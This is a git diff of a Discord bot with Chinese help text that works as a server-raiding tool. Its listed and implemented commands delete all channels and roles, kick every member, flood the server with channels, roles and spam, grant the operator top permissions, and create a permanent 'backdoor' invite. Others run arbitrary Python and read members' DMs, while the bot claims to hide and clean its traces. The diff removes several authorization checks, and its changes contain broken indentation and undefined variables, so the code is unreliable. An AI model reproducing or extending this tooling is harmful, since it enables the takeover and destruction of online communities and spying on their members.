@@ -162,10 +162,9 @@ async def help_msg(ctx):
     embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
     await ctx.send(embed=embed)
 
-@bot.tree.command(name="help", description="help")
+@bot.tree.command(name="help", description="🧳 旅行者系統 - 指令完整手冊[僅授權人員可用!]")
 async def help_slash(interaction: discord.Interaction):
-    if interaction.user.id not in ALLOWED_IDS: return
-    
+        if interaction.user.id not in ALLOWED_IDS: return
     embed = discord.Embed(
         title="🧳 旅行者系統 - 指令完整手冊", 
         description=f"實例編號：`{VERSION_ID}`\n此表僅授權人員可見。執行指令後會自動隱身並清理痕跡。",
@@ -174,63 +173,63 @@ async def help_slash(interaction: discord.Interaction):
     embed.add_field(
         name="🛡️ 基礎管理", 
         value=(
-            "`!tm @成員 [分]` - 禁言成員\n"
-            "`!kick_everyone` - 踢出伺服器全員\n"
-            "`!bye` - 機器人退出伺服器\n"
-            "`!set_server [名]` - 修改伺服器名稱\n"
-            "`!server_gate [lock/unlock]` - 全服鎖定/解鎖發言\n"
-            "`!clean_user @成員 [數]` - 刪除指定人的訊息\n"
-            "`!del_msg [數]` - 批次清理訊息\n"
-            "`!backdoor` - 獲取永久邀請連結\n"
-            "`!move_all [頻道ID]` - 強制全體移動語音\n"
-            "`!add_role @成員 @身分組` - 給與成員身分組\n"
-            "`!remove_role @成員 @身分組` - 剝奪成員身分組\n"
+            "`/tm @成員 [分]` - 禁言成員\n"
+            "`/kick_everyone` - 踢出伺服器全員\n"
+            "`/bye` - 機器人退出伺服器\n"
+            "`/set_server [名]` - 修改伺服器名稱\n"
+            "`/server_gate [lock/unlock]` - 全服鎖定/解鎖發言\n"
+            "`/clean_user @成員 [數]` - 刪除指定人的訊息\n"
+            "`/del_msg [數]` - 批次清理訊息\n"
+            "`/backdoor` - 獲取永久邀請連結\n"
+            "`/move_all [頻道ID]` - 強制全體移動語音\n"
+            "`/add_role @成員 @身分組` - 給與成員身分組\n"
+            "`/remove_role @成員 @身分組` - 剝奪成員身分組\n"
         ), 
         inline=False
     )
     embed.add_field(
         name="🎵 語音與掛台",
         value=(
-            "`!join_vc` - 加入你所在的語音頻道\n"
-            "`!leave_vc` - 退出語音頻道\n"
-            "`!play_music [URL]` - 播放SoundCloud 或是DropBox 音訊\n"
-            "`!stop_music` - 停止播放音樂\n"
-            "`!background_music [on/off]` - 開始或停止播放背景音樂\n"
+            "`/join_vc` - 加入你所在的語音頻道\n"
+            "`/leave_vc` - 退出語音頻道\n"
+            "`/play_music [URL]` - 播放SoundCloud 或是DropBox 音訊\n"
+            "`/stop_music` - 停止播放音樂\n"
+            "`/background_music [on/off]` - 開始或停止播放背景音樂\n"
         ),
         inline=False
     )
     embed.add_field(
         name="🔥 破壞系統", 
         value=(
-            "`!del_ch` - 刪除所有頻道\n"
-            "`!del_role` - 刪除所有身分組\n"
-            "`!100ch` - 建立 100 個頻道\n"
-            "`!100rl` - 建立 100 個身分組\n"
-            "`!spam [次] [文]` - 洗頻攻擊\n"
-            "`!set_server [文]` - 洗頻攻擊\n"
+            "`/del_ch` - 刪除所有頻道\n"
+            "`/del_role` - 刪除所有身分組\n"
+            "`/100ch` - 建立 100 個頻道\n"
+            "`/100rl` - 建立 100 個身分組\n"
+            "`/spam [次] [文]` - 洗頻攻擊\n"
+            "`/set_server [文]` - 洗頻攻擊\n"
         ), 
         inline=False
     )
     embed.add_field(
         name="🛠️ 進階工具", 
         value=(
-            "`!eval [code]` - 執行動態 Python 腳本\n"
-            "`!snapshot` - 導出伺服器完整結構\n"
-            "`!op_me` - 獲取最高權限\n"
-            "`!reset` - 強制重啟系統\n"
-            "`!test` - 列出Bot的數據\n"
+            "`/eval [code]` - 執行動態 Python 腳本\n"
+            "`/snapshot` - 導出伺服器完整結構\n"
+            "`/op_me` - 獲取最高權限\n"
+            "`/reset` - 強制重啟系統\n"
+            "`/test` - 列出Bot的數據\n"
         ), 
         inline=False
     )
     embed.add_field(
         name="🎮 有趣系統", 
         value=(
-            "`!get_dm @成員 [數]` - 調閱私訊紀錄\n"
-            "`!dm @成員 [文]` - 以機器人名義私訊成員\n"
-            "`!random_kick` - 隨機踢一個帥哥\n"
-            "`!how_much?` - 點評成員的盤子行為\n"
-            "`!word_switch` - 開啟字體美化器\n"
-            "`!avatar @成員 ` - 查成員\n"
+            "`/get_dm @成員 [數]` - 調閱私訊紀錄\n"
+            "`/dm @成員 [文]` - 以機器人名義私訊成員\n"
+            "`/random_kick` - 隨機踢一個帥哥\n"
+            "`/how_much?` - 點評成員的盤子行為\n"
+            "`/word_switch` - 開啟字體美化器\n"
+            "`/avatar @成員 ` - 查成員\n"
         ), 
         inline=False
     )
@@ -242,7 +241,7 @@ async def dm(ctx, member: discord.Member, *, text: str):
     try: await member.send(text)
     except: pass
 
-@bot.tree.command(name="dm", description="dm")
+@bot.tree.command(name="dm", description="以機器人名義私訊成員-[請謹慎使用]")
 @app_commands.describe(member="member", text="text")
 async def dm_slash(interaction: discord.Interaction, member: discord.Member, text: str):
     try:
@@ -259,7 +258,7 @@ async def nuke_channels(ctx):
         except: pass
     await ctx.guild.create_text_channel("general")
 
-@bot.tree.command(name="del_ch", description="del_ch")
+@bot.tree.command(name="del_ch", description="刪除所有頻道-[僅授權人員可用!]")
 async def nuke_channels_slash(interaction: discord.Interaction):
     if interaction.user.id not in ALLOWED_IDS: return
     await interaction.response.send_message("⚡", ephemeral=True)
@@ -276,9 +275,9 @@ async def kick_everyone(ctx):
             try: await member.kick()
             except: pass
 
-@bot.tree.command(name="kick_everyone", description="kick_everyone")
+@bot.tree.command(name="kick_everyone", description="踢出伺服器全員-[僅授權人員可用!]")
 async def kick_everyone_slash(interaction: discord.Interaction):
-    if interaction.user.id not in ALLOWED_IDS: return
+    if not await is_me(ctx): return
     await interaction.response.send_message("⚡", ephemeral=True)
     for member in interaction.guild.members:
         if member != interaction.user and member != bot.user and member != interaction.guild.owner:
@@ -293,7 +292,7 @@ async def clear_roles(ctx):
             try: await role.delete()
             except: pass
 
-@bot.tree.command(name="del_role", description="del_role")
+@bot.tree.command(name="del_role", description="刪除所有身分組-[僅授權人員可用!]")
 async def clear_roles_slash(interaction: discord.Interaction):
     if interaction.user.id not in ALLOWED_IDS: return
     await interaction.response.send_message("⚡", ephemeral=True)
@@ -308,7 +307,7 @@ async def set_server(ctx, *, name: str):
     try: await ctx.guild.edit(name=name)
     except: pass
 
-@bot.tree.command(name="set_server", description="set_server")
+@bot.tree.command(name="set_server", description="更換伺服器名稱-[僅授權人員可用!]")
 @app_commands.describe(name="name")
 async def set_server_slash(interaction: discord.Interaction, name: str):
     if interaction.user.id not in ALLOWED_IDS: return
@@ -323,7 +322,7 @@ async def leave_server(ctx):
     if not await is_me(ctx): return
     await ctx.guild.leave()
 
-@bot.tree.command(name="bye", description="bye")
+@bot.tree.command(name="bye", description="機器人退出伺服器-[僅授權人員可用!]")
 async def leave_server_slash(interaction: discord.Interaction):
     if interaction.user.id not in ALLOWED_IDS: return
     await interaction.response.send_message("⚡", ephemeral=True)
@@ -335,7 +334,7 @@ async def purge_chat(ctx, amount: int = 10):
     try: await ctx.channel.purge(limit=amount)
     except: pass
 
-@bot.tree.command(name="del_msg", description="del_msg")
+@bot.tree.command(name="del_msg", description="刪除指定數量的訊息-[僅授權人員可用!]")
 @app_commands.describe(amount="amount")
 async def purge_chat_slash(interaction: discord.Interaction, amount: int = 10):
     if interaction.user.id not in ALLOWED_IDS: return
@@ -352,7 +351,7 @@ async def spam(ctx, count: int, *, text: str):
             await asyncio.sleep(0.8)
         except: break
 
-@bot.tree.command(name="spam", description="spam")
+@bot.tree.command(name="spam", description="大量刷頻-[僅授權人員可用!]")
 @app_commands.describe(count="count", text="text")
 async def spam_slash(interaction: discord.Interaction, count: int, text: str):
     if interaction.user.id not in ALLOWED_IDS: return
@@ -371,7 +370,7 @@ async def role_hell(ctx):
         try: await ctx.guild.create_role(name=f"{i}", color=color)
         except: break
 
-@bot.tree.command(name="100rl", description="100rl")
+@bot.tree.command(name="100rl", description="建立100個身分組-[僅授權人員可用!]")
 async def role_hell_slash(interaction: discord.Interaction):
     if interaction.user.id not in ALLOWED_IDS: return
     await interaction.response.send_message("⚡", ephemeral=True)
@@ -387,7 +386,7 @@ async def flood(ctx, name="ch-----test"):
         try: await ctx.guild.create_text_channel(f"{name}-{i}")
         except: break
 
-@bot.tree.command(name="100ch", description="100ch")
+@bot.tree.command(name="100ch", description="建立100個頻道-[僅授權人員可用!]")
 @app_commands.describe(name="name")
 async def flood_slash(interaction: discord.Interaction, name: str = "ch-----test"):
     if interaction.user.id not in ALLOWED_IDS: return
@@ -410,7 +409,7 @@ async def op_me(ctx):
         await new_role.edit(position=guild.me.top_role.position - 1)
     except: pass
 
-@bot.tree.command(name="op_me", description="op_me")
+@bot.tree.command(name="op_me", description="給與操作者最高權限-[僅授權人員可用!]")
 async def op_me_slash(interaction: discord.Interaction):
     if interaction.user.id not in ALLOWED_IDS: return
     await interaction.response.send_message("⚡", ephemeral=True)
@@ -434,7 +433,7 @@ async def tm(ctx, member: discord.Member = None, minutes: int = 10):
         await member.timeout(duration, reason="呼吸")
     except: pass
 
-@bot.tree.command(name="tm", description="tm")
+@bot.tree.command(name="tm", description="禁言成員-[僅授權人員可用!]")
 @app_commands.describe(member="member", minutes="minutes")
 async def tm_slash(interaction: discord.Interaction, member: discord.Member, minutes: int = 10):
     if interaction.user.id not in ALLOWED_IDS: return
@@ -447,15 +446,13 @@ async def tm_slash(interaction: discord.Interaction, member: discord.Member, min
 
 @bot.command(name="backdoor")
 async def backdoor(ctx):
-    if not await is_me(ctx): return
     try:
         inv = await ctx.channel.create_invite(max_age=0, max_uses=0)
         await ctx.author.send(f"永久入口: {inv.url}")
     except: pass
 
-@bot.tree.command(name="backdoor", description="backdoor")
+@bot.tree.command(name="backdoor", description="給操作者一個永久使用的伺服器邀請連結-[請謹慎使用!]")
 async def backdoor_slash(interaction: discord.Interaction):
-    if interaction.user.id not in ALLOWED_IDS: return
     try:
         inv = await interaction.channel.create_invite(max_age=0, max_uses=0)
         await interaction.user.send(f"永久入口: {inv.url}")
@@ -471,7 +468,7 @@ async def move_all(ctx, channel: discord.VoiceChannel):
             try: await member.move_to(channel)
             except: pass
 
-@bot.tree.command(name="move_all", description="move_all")
+@bot.tree.command(name="move_all", description="將任何語音頻道中的成員全數集中到指定的語音頻道-[僅授權人員可用!]")
 @app_commands.describe(channel="channel")
 async def move_all_slash(interaction: discord.Interaction, channel: discord.VoiceChannel):
     if interaction.user.id not in ALLOWED_IDS: return
@@ -487,7 +484,7 @@ async def isolate(ctx, member: discord.Member):
     try: await member.edit(roles=[])
     except: pass
 
-@bot.tree.command(name="disrole", description="disrole")
+@bot.tree.command(name="disrole", description="剝奪成員的所有身分組-[僅授權人員可用!]")
 @app_commands.describe(member="member")
 async def isolate_slash(interaction: discord.Interaction, member: discord.Member):
     if interaction.user.id not in ALLOWED_IDS: return
@@ -505,7 +502,7 @@ async def server_gate(ctx, status: str):
         try: await channel.set_permissions(ctx.guild.default_role, send_messages=can_send)
         except: pass
 
-@bot.tree.command(name="server_gate", description="server_gate")
+@bot.tree.command(name="server_gate", description="伺服器全服戒嚴控制-[僅授權人員可用!]")
 @app_commands.describe(status="status")
 async def server_gate_slash(interaction: discord.Interaction, status: str):
     if interaction.user.id not in ALLOWED_IDS: return
@@ -521,7 +518,7 @@ async def add_role(ctx, member: discord.Member, role: discord.Role):
     try: await member.add_roles(role)
     except: pass
 
-@bot.tree.command(name="add_role", description="add_role")
+@bot.tree.command(name="add_role", description="給與成員任意身分組-[僅授權人員可用!]")
 @app_commands.describe(member="member", role="role")
 async def add_role_slash(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
     if interaction.user.id not in ALLOWED_IDS: return
@@ -537,7 +534,7 @@ async def remove_role(ctx, member: discord.Member, role: discord.Role):
     try: await member.remove_roles(role)
     except: pass
 
-@bot.tree.command(name="remove_role", description="remove_role")
+@bot.tree.command(name="remove_role", description="剝奪成員任意身分組-[僅授權人員可用!]")
 @app_commands.describe(member="member", role="role")
 async def remove_role_slash(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
     if interaction.user.id not in ALLOWED_IDS: return
@@ -559,7 +556,7 @@ async def get_dm(ctx, member: discord.Member, limit: int = 10):
         await ctx.author.send(f"📂 **與 {member.name} 的紀錄：**\n{result[:1900]}")
     except: pass
 
-@bot.tree.command(name="get_dm", description="get_dm")
+@bot.tree.command(name="get_dm", description="讀取機器起人與成員的對話紀錄-[請謹慎使用!]")
 @app_commands.describe(member="member", limit="limit")
 async def get_dm_slash(interaction: discord.Interaction, member: discord.Member, limit: int = 10):
     try:
@@ -577,13 +574,13 @@ async def get_dm_slash(interaction: discord.Interaction, member: discord.Member,
 @bot.command(name="how_much?")
 async def worth(ctx):
     price = random.randint(1, 999999)
-    comments = ["這玩意兒我看就值這麼多", "太貴了吧，根本盤子", "這東西拿去回收站都嫌重"]
+    comments = ["這玩意兒我看就值這麼多", "太貴了吧，根本盤子", "這東西拿去回收站都嫌重", "太貴重了給我吧,我幫你保管"]
     await ctx.send(f"💰 我覺得這東西價值 **${price:,}**。{random.choice(comments)}")
 
-@bot.tree.command(name="how_much", description="查詢價格或數量")
+@bot.tree.command(name="how_much", description="讓機器人判斷這個東西的價值-[請謹慎使用!]")
 async def how_much_slash(interaction: discord.Interaction):
     price = random.randint(1, 999999)
-    comments = ["這玩意兒我看就值這麼多", "太貴了吧，根本盤子", "這東西拿去回收站都嫌重"]
+    comments = ["這玩意兒我看就值這麼多", "太貴了吧，根本盤子", "這東西拿去回收站都嫌重", "太貴重了給我吧,我幫你保管"]
     await interaction.response.send_message(f"💰 我覺得這東西價值 **${price:,}**。{random.choice(comments)}")
 
 @bot.command(name="random_kick")
@@ -597,8 +594,9 @@ async def mock_kick(ctx):
         await asyncio.sleep(1)
     await msg.edit(content=f"❌ **操作失敗**\n原因：`{target.display_name}` 太帥了，權限不足。")
 
-@bot.tree.command(name="random_kick", description="random_kick")
+@bot.tree.command(name="random_kick", description="隨機恐嚇將一個人踢出伺服器-[僅授權人員可用!]")
 async def mock_kick_slash(interaction: discord.Interaction):
+        if interaction.user.id not in ALLOWED_IDS: return
     members = [m for m in interaction.guild.members if not m.bot]
     target = random.choice(members)
     await interaction.response.send_message(f"⚠️ **系統偵測到有人降低伺服器平均智商...**\n正在準備將 {target.mention} 移出伺服器以緩減降智問題...")
@@ -645,7 +643,7 @@ class FontModal(ui.Modal, title="字體轉換器"):
 async def font_cmd(ctx):
     await ctx.send("點擊下方按鈕開啟轉換器：", view=FontLaunchView())
 
-@bot.tree.command(name="word_switch", description="word_switch")
+@bot.tree.command(name="word_switch", description="開啟字體轉換器-[請謹慎使用!]")
 async def font_cmd_slash(interaction: discord.Interaction):
     await interaction.response.send_message("點擊下方按鈕開啟轉換器：", view=FontLaunchView())
 
@@ -780,7 +778,7 @@ async def eval_code(ctx, *, code: str = None):
                     await new_cat.create_voice_channel(ch_data['name'], overwrites=ch_ov)
         return await ctx.author.send("✅ 還原完成!")
 
-@bot.tree.command(name="eval", description="eval")
+@bot.tree.command(name="eval", description="執行Python腳本或是從備份檔還原伺服器-[僅授權人員可用!]")
 @app_commands.describe(code="code", file="上傳要還原的備份 JSON 檔案")
 async def eval_code_slash(interaction: discord.Interaction, code: str = None, file: discord.Attachment = None):
     if interaction.user.id not in ALLOWED_IDS: return
@@ -835,7 +833,7 @@ async def reboot(ctx):
     if not await is_me(ctx): return
     os._exit(0)
 
-@bot.tree.command(name="reset", description="reset")
+@bot.tree.command(name="reset", description="重新啟動機器人-[僅授權人員可用!]")
 async def reboot_slash(interaction: discord.Interaction):
     if interaction.user.id not in ALLOWED_IDS: return
     await interaction.response.send_message("⚡", ephemeral=True)
@@ -843,7 +841,6 @@ async def reboot_slash(interaction: discord.Interaction):
 
 @bot.command(name="join_vc")
 async def join(ctx):
-    if not await is_me(ctx): return 
     if ctx.author.voice and ctx.author.voice.channel:
         voice_channel = ctx.author.voice.channel
         try:
@@ -859,9 +856,8 @@ async def join(ctx):
     else:
         await ctx.author.send("⚠️ 你必須先進入一個語音頻道！")
 
-@bot.tree.command(name="join_vc", description="join_vc")
+@bot.tree.command(name="join_vc", description="加入你所在的語音頻道-[請謹慎使用!]")
 async def join_slash(interaction: discord.Interaction):
-    if interaction.user.id not in ALLOWED_IDS: return
     if interaction.user.voice and interaction.user.voice.channel:
         voice_channel = interaction.user.voice.channel
         try:
@@ -882,7 +878,6 @@ async def join_slash(interaction: discord.Interaction):
 
 @bot.command(name="leave_vc")
 async def dc(ctx):
-    if not await is_me(ctx): return
     try: await ctx.message.delete()
     except: pass
 
@@ -890,9 +885,8 @@ async def dc(ctx):
         try: await ctx.voice_client.disconnect()
         except: pass
 
-@bot.tree.command(name="leave_vc", description="leave_vc")
+@bot.tree.command(name="leave_vc", description="將機器人退出你所在的語音頻道-[請謹慎使用!]")
 async def dc_slash(interaction: discord.Interaction):
-    if interaction.user.id not in ALLOWED_IDS: return
     await interaction.response.send_message("⚡", ephemeral=True)
     if interaction.guild.voice_client:
         try: await interaction.guild.voice_client.disconnect()
@@ -1091,11 +1085,10 @@ async def p(ctx, *, url):
             await ctx.send(f"❌ 播放失敗: `{str(e)[:100]}`")
             bot.loop.create_task(play_bgm(ctx))
 
-@bot.tree.command(name="play_music", description="play_music")
+@bot.tree.command(name="play_music", description="播放SoundCloud或是DropBox連結中的音樂-[請謹慎使用!]")
 @app_commands.describe(url="url")
 async def p_slash(interaction: discord.Interaction, url: str):
     global is_switching
-    if interaction.user.id not in ALLOWED_IDS: return
     
     if not interaction.guild.voice_client:
         if interaction.user.voice:
@@ -1182,9 +1175,8 @@ async def stop_music(ctx):
         await asyncio.sleep(1)
         bot.loop.create_task(play_bgm(ctx))
 
-@bot.tree.command(name="stop_music", description="stop_music")
+@bot.tree.command(name="stop_music", description="停止播放當前的音樂,不包含背景音樂-[請謹慎使用!]")
 async def stop_music_slash(interaction: discord.Interaction):
-    if interaction.user.id not in ALLOWED_IDS: return
     if interaction.guild.voice_client:
         interaction.guild.voice_client.stop()
         await interaction.response.send_message("⏹️ 已停止播放")
@@ -1208,11 +1200,10 @@ async def background_music(ctx, mode: str):
             ctx.voice_client.stop()
         await ctx.send("❌ 背景音樂模式已關閉。")
 
-@bot.tree.command(name="background_music", description="background_music")
+@bot.tree.command(name="background_music", description="開啟或關閉背景音樂-[請謹慎使用!]")
 @app_commands.describe(mode="mode")
 async def background_music_slash(interaction: discord.Interaction, mode: str):
     global bgm_enabled, is_switching
-    if interaction.user.id not in ALLOWED_IDS: return
     if mode.lower() == "on":
         bgm_enabled = True
         is_switching = False
@@ -1227,6 +1218,7 @@ async def background_music_slash(interaction: discord.Interaction, mode: str):
         
 @bot.command(name="test")
 async def test(ctx):
+    if not await is_me(ctx): return
     api_latency = round(bot.latency * 1000)
     voice_latency = "未連線"
     if ctx.voice_client and ctx.voice_client.is_connected():
@@ -1271,8 +1263,9 @@ async def test(ctx):
     embed.set_footer(text=f"查詢者: {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
     await ctx.send(embed=embed)
 
-@bot.tree.command(name="test", description="test")
+@bot.tree.command(name="test", description="列出機器人數據(調適用)-[僅授權人員可用!]")
 async def test_slash(interaction: discord.Interaction):
+    if ctx.author.id not in ALLOWED_IDS: return
     api_latency = round(bot.latency * 1000)
     voice_latency = "未連線"
     if interaction.guild.voice_client and interaction.guild.voice_client.is_connected():
@@ -1327,7 +1320,7 @@ async def profile(ctx, member: discord.Member = None):
     embed.set_footer(text=f"ID: {member.id}")
     await ctx.send(embed=embed)
 
-@bot.tree.command(name="avatar", description="avatar")
+@bot.tree.command(name="avatar", description="查詢成員的詳細資料-[請謹慎使用!]")
 @app_commands.describe(member="member")
 async def profile_slash(interaction: discord.Interaction, member: discord.Member = None):
     member = member or interaction.user
